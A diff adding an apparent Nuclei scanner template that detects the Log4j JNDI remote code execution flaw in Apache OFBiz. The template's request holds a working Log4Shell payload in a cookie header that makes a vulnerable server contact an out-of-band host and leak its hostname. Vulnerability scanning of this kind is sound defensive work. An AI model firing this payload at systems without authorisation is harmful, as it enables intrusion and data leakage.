@@ -1,0 +1,33 @@
+id: apache-ofbiz-log4j-rce
+
+info:
+  name: Apache OFBiz Log4j JNDI RCE
+  author: pdteam
+  severity: critical
+  tags: ofbiz,oast,log4j,rce,apache,jndi
+
+requests:
+  - raw:
+      - |
+        GET /webtools/control/main HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: OFBiz.Visitor=${jndi:ldap://${hostName}.{{interactsh-url}}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
